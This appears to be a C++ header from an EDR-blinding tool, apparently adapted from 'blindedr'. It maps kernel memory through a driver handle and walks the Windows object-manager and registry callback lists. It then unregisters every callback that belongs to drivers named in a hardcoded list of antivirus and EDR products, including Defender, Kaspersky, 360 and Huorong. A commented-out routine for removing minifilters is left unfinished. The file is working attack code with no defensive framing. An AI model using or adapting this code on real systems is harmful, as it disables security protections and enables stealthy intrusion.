#pragma once 
//copy from blindedr 

#include <Psapi.h>

char GetPsProcessAndProcessTypeMagic[] = { 0x4c,0x8b,0x05 };
CONST CHAR* AVDriver[] = {
	"klflt.sys","klhk.sys","klif.sys","klupd_KES-21-9_arkmon.sys","KLIF.KES-21-9.sys","klbackupflt.KES-21-9.sys","klids.sys","klupd_klif_arkmon.sys",
	"QaxNfDrv.sys","QKBaseChain64.sys","QKNetFilter.sys","QKSecureIO.sys","QesEngEx.sys","QkHelp64.sys","qmnetmonw64.sys",
	"QMUdisk64_ev.sys","QQSysMonX64_EV.sys","TAOKernelEx64_ev.sys","TFsFltX64_ev.sys","TAOAcceleratorEx64_ev.sys","QQSysMonX64.sys","TFsFlt.sys",
	"sysdiag_win10.sys","sysdiag.sys",
	"360AvFlt.sys",
	"360qpesv64.sys","360AntiSteal64.sys","360AntiSteal.sys","360qpesv.sys","360FsFlt.sys","360Box64.sys","360netmon.sys","360AntiHacker64.sys","360Hvm64.sys","360qpesv64.sys","360AntiHijack64.sys","360AntiExploit64.sys","DsArk64.sys","360Sensor64.sys","DsArk.sys",
	"WdFilter.sys","MpKslDrv.sys","mpsdrv.sys","WdNisDrv.sys","win32k.sys",
	"TmPreFilter.sys","TmXPFlt.sys",
	"AHipsFilter.sys","AHipsFilter64.sys","GuardKrnl.sys","GuardKrnl64.sys","GuardKrnlXP64.sys","protectdrv.sys","protectdrv64.sys","AntiyUSB.sys","AntiyUSB64.sys","AHipsXP.sys","AHipsXP64.sys","AtAuxiliary.sys","AtAuxiliary64.sys","TrustSrv.sys","TrustSrv64.sys"

};

CHAR* GetDriverName(INT64 DriverCallBackFuncAddr);
u64 map_kernel_addr(u64 krnladdr, u64 size, u64 map_ntosaddr);
u64 get_oskrnl_kernel_address();


ULONG64 GetPsProcessAndProcessTypeAddr(HANDLE hDeviceHandle , INT flag) {
	ULONG64 FuncAddress = 0;
	if (flag == 1) {
		FuncAddress = PEFile::GetNTOSFuncAddress((CHAR*)"NtDuplicateObject");
	}
	else if (flag == 2) {
		FuncAddress = PEFile::GetNTOSFuncAddress((CHAR*)"NtOpenThreadTokenEx");
	}
	if (FuncAddress == 0) return 0;

	IOCTL_WINIO_MAPSTRUCT * map = Driver::MapPhysicalMemory(hDeviceHandle, 0x2048, NTOSKRNL_PHYSICAL_MEMORY + FuncAddress);
	u64 mapaddr = map->RTN_MAPADDR;
	u64 bytesaddr = (u64)Memory::find_pattern((const void*)mapaddr, 0x2048, (const unsigned char*)GetPsProcessAndProcessTypeMagic, strlen(GetPsProcessAndProcessTypeMagic));
	//std::cout << "find in " << std::hex << bytesaddr - mapaddr << std::endl;
	char bytes[4] = { 0 };
	memcpy(bytes,(BYTE*)bytesaddr + 3, 4);
	INT32 offset = *(INT32*)bytes;
	u64 returnaddr = offset + 7 + FuncAddress + bytesaddr - mapaddr;
	std::cout << "[+]Successfully get " << std::hex << returnaddr << std::endl;
	Driver::UnMapPhysicalMemory(hDeviceHandle, map);
	return returnaddr;
}

void RemoveObRegisterCallbacks(HANDLE hDeviceHandle, u64 processtypeaddr,u64 map_knrladdr) {
	u64 processtype_addr = NULL;
	memcpy(&processtype_addr, (void*)(map_knrladdr+ processtypeaddr),8); //拿到processtype 的内核地址
	u64 processtype = map_kernel_addr(processtype_addr, 0x100, map_knrladdr); // 映射内核地址得到用户空间地址
	u64 callback_list = NULL;
	memcpy(&callback_list, (const void *)(processtype + 0xc8), 8); //拿到callback_list 的 内核地址
	std::cout << "[+]callback_list " << std::hex << callback_list << std::endl;


	u64 flink = 0;
	u64 blink = 0; // 链表头
	
	memcpy(&flink, (const void*)(processtype + 0xc8), 8); //拿到callback_list 的 内核地址
	memcpy(&blink, (const void*)(processtype + 0xc8 + 0x8), 8); //拿到callback_list + 0x8 的 内核地址

	std::cout << "[+]Flink " << std::hex << flink << std::endl;
	std::cout << "[+]Blink " << std::hex << blink << std::endl;
	
	u64 kernel_blink = blink;
	flink = map_kernel_addr(flink,0x10,map_knrladdr); // 映射成r3的地址
	blink = map_kernel_addr(blink, 0x10, map_knrladdr);

	_LIST_ENTRY* entry = (_LIST_ENTRY*)blink;
	int entry_count = 0;
	u64 entry_addr[256] = { 0 };
	u64 entry_addr_kernel[256] = { 0 };
	do {
		entry = entry->Flink;
		entry_addr_kernel[entry_count] = (u64)entry;
		entry = (_LIST_ENTRY*)map_kernel_addr((u64)entry, 0x100, map_knrladdr);
		entry_addr[entry_count] = (u64)entry;
		entry_count++;

	} while ((u64)entry_addr_kernel[entry_count -1] != kernel_blink && entry_count < 255);

	for (int i = 0; i < entry_count; i++) {
		u64 callback_list_entry = entry_addr[i];
		u64 EDROperation = NULL;
		u64 EDROperation1 = NULL;

		memcpy(&EDROperation, (BYTE*)callback_list_entry + 0x28, 8);
		memcpy(&EDROperation1, (BYTE*)callback_list_entry + 0x20, 8);
		char* EDROperationDriverName = GetDriverName(EDROperation);
		char* EDROperationDriverName1 = GetDriverName(EDROperation1);
		bool isInAVList = false;
		if (EDROperationDriverName != nullptr) {
			std::cout << "[+] find driver " << EDROperationDriverName << std::endl;
			for (int j = 0; j < _countof(AVDriver); ++j) {
				if (_stricmp(EDROperationDriverName, AVDriver[j]) == 0) {
					isInAVList = true;
					break;
				}
			}
		}
		else if(EDROperationDriverName1 != nullptr) {
			std::cout << "[+] find driver " << EDROperationDriverName1 << std::endl;
			for (int j = 0; j < _countof(AVDriver); ++j) {
				if (_stricmp(EDROperationDriverName1, AVDriver[j]) == 0) {
					isInAVList = true;
					break;
				}
			}
		}

		// 检查该驱动是否在 AVDriver 列表中
		


		
		
		if (isInAVList) {
			Syscall::ObUnRegisterCallbacks(entry_addr_kernel[i] - 0x20, NtDrawText, map_knrladdr);
		}
		

	}


	
}

CHAR* GetDriverName(INT64 DriverCallBackFuncAddr) {
	DWORD bytesNeeded = 0;
	if (EnumDeviceDrivers(NULL, 0, &bytesNeeded)) {
		DWORD ArraySize = bytesNeeded / 8;
		DWORD ArraySizeByte = bytesNeeded;
		INT64* addressArray = (INT64*)malloc(ArraySizeByte);
		if (addressArray == NULL) return NULL;
		EnumDeviceDrivers((LPVOID*)addressArray, ArraySizeByte, &bytesNeeded);
		INT64* ArrayMatch = (INT64*)malloc(ArraySizeByte + 100);
		if (ArrayMatch == NULL) return NULL;
		INT j = 0;
		for (DWORD i = 0; i < ArraySize - 1; i++) {
			// && (DriverCallBackFuncAddr < addressArray[i + 1])
			if ((DriverCallBackFuncAddr > (INT64)addressArray[i])) {
				ArrayMatch[j] = addressArray[i];
				j++;
			}
		}
		INT64 tmp = 0;
		INT64 MatchAddr = 0;
		for (int i = 0; i < j; i++) {
			if (i == 0) {
				tmp = _abs64(DriverCallBackFuncAddr - ArrayMatch[i]);
				MatchAddr = ArrayMatch[i];

			}
			else if (_abs64(DriverCallBackFuncAddr - ArrayMatch[i]) < tmp) {
				tmp = _abs64(DriverCallBackFuncAddr - ArrayMatch[i]);
				MatchAddr = ArrayMatch[i];
			}
		}

		CHAR* DriverName = (CHAR*)calloc(1024, 1);
		if (GetDeviceDriverBaseNameA((LPVOID)MatchAddr, DriverName, 1024) > 0) {
			//printf("%I64x\t%s", MatchAddr,DriverName);
			return DriverName;

		}
		free(addressArray);
		free(ArrayMatch);
		free(DriverName);
	}
	return NULL;
}

u64 map_kernel_addr(u64 krnladdr,u64 size,u64 map_ntosaddr) {
	// 假设 Syscall::GetPhysicalMemoryAddress 已正确定义
	u64 result = Syscall::GetPhysicalMemoryAddress(krnladdr, NtDrawText, MmGetPhysicalAddress, map_ntosaddr);

	//std::cout << "[DEBUG] krnladdr: 0x" << std::hex << krnladdr << std::endl;
	IOCTL_WINIO_MAPSTRUCT * map; 
	map = Driver::MapPhysicalMemory(hDeviceHandle, size, result);
	return map->RTN_MAPADDR;
}

u64 get_oskrnl_kernel_address(){
	char szKernelName[MAX_PATH] = { 0 };
	HMODULE hModules[1024];
	DWORD cbNeeded;
	u64 kernel_addr = NULL;

	if (EnumDeviceDrivers((LPVOID*)hModules, sizeof(hModules), &cbNeeded)) {
		for (int i = 0; i < cbNeeded / sizeof(HMODULE); ++i) {
			if (GetDeviceDriverBaseNameA(hModules[i], szKernelName, sizeof(szKernelName))) {
				if (strcmp(szKernelName, "ntoskrnl.exe") == 0) {
					std::cout << "[+]ntoskrnl.exe base address: 0x" << std::hex << (uintptr_t)hModules[i] << std::endl;
					kernel_addr = (u64)hModules[i];
					break;
				}
			}
			memset(szKernelName, 0, sizeof(szKernelName));
		}
	}
	return kernel_addr;
}

ULONG64 GetCallbackListHeadAddr(HANDLE hDeviceHandle , u64 ntosmap) {
	u64 CmSetCallbackObjectContextaddr = PEFile::GetNTOSFuncAddress((char*)"CmSetCallbackObjectContext");
	char GetCallbackListHeadMagic[] = {0x48,0x8b,0x1d};
	u64 magicbytes = (u64)Memory::find_pattern((void*)(ntosmap + CmSetCallbackObjectContextaddr), 0x200, (const unsigned char *)GetCallbackListHeadMagic, sizeof(GetCallbackListHeadMagic));
	char bytes[4] = { 0 };
	memcpy(bytes, (BYTE*)magicbytes + 3, 4);
	INT32 offset = *(INT32*)bytes;
	u64 returnaddr = offset + 7  + (magicbytes - ntosmap);
	std::cout << "[+]Find Magic in " << std::hex << returnaddr << std::endl;
	return returnaddr;
}

void RemoveCMRegisterCallbacks(HANDLE hDeviceHandle, u64 map_knrladdr) {
	u64 callbacklist = GetCallbackListHeadAddr(hDeviceHandle,map_knrladdr);
	u64 now_kernel_addr = NTOSKRNL_KERNEL_MEMORY + callbacklist;
	u64 now_map_addr = map_kernel_addr(now_kernel_addr, 0x100, map_knrladdr);
	u64 next_addr = NULL;
	int count = 0;
	while (true) {
		memcpy(&next_addr, (void*)now_map_addr, 8); // 拿到下一个Node
		u64 function = NULL;
		memcpy(&function, (void*)(now_map_addr + 0x28), 8);
		char* CallbacksDriverName = GetDriverName(function);
		std::cout << "[+] find driver " << CallbacksDriverName << std::endl;
		bool isInAVList = false;
		for (int j = 0; j < _countof(AVDriver); ++j) {
			if (_stricmp(CallbacksDriverName, AVDriver[j]) == 0) {
				isInAVList = true;
				break;
			}
		}

		if (isInAVList) {
			u64 cookies = 0;
			memcpy(&cookies, (void*)(now_map_addr + 0x18),8);
			std::cout << "[+] find cookies " << std::hex << cookies << std::endl;
			Syscall::CmunRegisterCallback(cookies,NtDrawText,map_knrladdr);
		}

		if (next_addr == now_kernel_addr) {
			break;
		}
		now_map_addr = map_kernel_addr(next_addr, 0x100, map_knrladdr);

	}
}

u64 get_fltmgr_kernel_address() {
	char szKernelName[MAX_PATH] = { 0 };
	HMODULE hModules[1024];
	DWORD cbNeeded;
	u64 kernel_addr = NULL;

	if (EnumDeviceDrivers((LPVOID*)hModules, sizeof(hModules), &cbNeeded)) {
		for (int i = 0; i < cbNeeded / sizeof(HMODULE); ++i) {
			if (GetDeviceDriverBaseNameA(hModules[i], szKernelName, sizeof(szKernelName))) {
				if (strcmp(szKernelName, "FLTMGR.SYS") == 0) {
					std::cout << "[+]fltMgr.sys base address: 0x" << std::hex << (uintptr_t)hModules[i] << std::endl;
					return (u64)hModules[i];
				}
			}
			memset(szKernelName, 0, sizeof(szKernelName));
		}
	}
	
}
/*
ULONG64 RemoveMiniFilterCallback(HANDLE hDeviceHandle, u64 map_knrladdr) {
	u64 fltmgr_base_addr = get_fltmgr_kernel_address();
	
	u64 offset = 0;
	for (u64 i = fltmgr_base_addr; i < fltmgr_base_addr + 0x10000; i += 0x1000) { //这个傻逼缺页
		

		u64 result = Syscall::GetPhysicalMemoryAddress(i, NtDrawText, MmGetPhysicalAddress, map_knrladdr);
		IOCTL_WINIO_MAPSTRUCT* map = Driver::MapPhysicalMemory(hDeviceHandle, 0x1000, result);
		u64 find = (u64)Memory::find_pattern((void*)map->RTN_MAPADDR, 0x1000, MiniFilterMagic, sizeof(MiniFilterMagic));
		if (find != 0) {
			char bytes[4] = { 0 };
			memcpy(bytes, (BYTE*)find + 11, 4);
			offset = *(INT32*)bytes;
			offset = offset+7; //得到语句和目标的地址
			offset = offset + 8 + (find - map->RTN_MAPADDR) + i;
			
			Driver::UnMapPhysicalMemory(hDeviceHandle, map);
			break;
		}
		else {
			Driver::UnMapPhysicalMemory(hDeviceHandle, map);
		}
		

	}
	
	if (offset != 0) {
		std::cout << "[+]Find FltGlobals in " << std::hex << offset << std::endl;
		u64 FltGlobals_Kernel_Address = offset;
		u64 FltGlobals_Map_Address = map_kernel_addr(FltGlobals_Kernel_Address, 0x100, map_knrladdr);
		u64 FrameList = 0;
		memcpy(&FrameList, (BYTE*)FltGlobals_Map_Address + 0x58, 8);
		std::cout << "[+]Find FrameList in " << std::hex << FrameList << std::endl;
		u64 Map_FrameList = map_kernel_addr(FrameList, 0x100, map_knrladdr);
		u64 rlist = 0;
		memcpy(&rlist, (BYTE*)Map_FrameList + 0x68, 8); // rlist 是我们的原始kernel address
		_LIST_ENTRY* Map_rlist = (_LIST_ENTRY*)map_kernel_addr(rlist, 0x100, map_knrladdr);
		_LIST_ENTRY* entry = Map_rlist;
		do {
			entry = Map_rlist->Flink;
			_LIST_ENTRY* map_entry = (_LIST_ENTRY*)map_kernel_addr((u64)entry - 0x8, 0x100, map_knrladdr);
			u64 FLTP_FRAME = 0;
			memcpy


		}while()
		
	return 0;



}
*/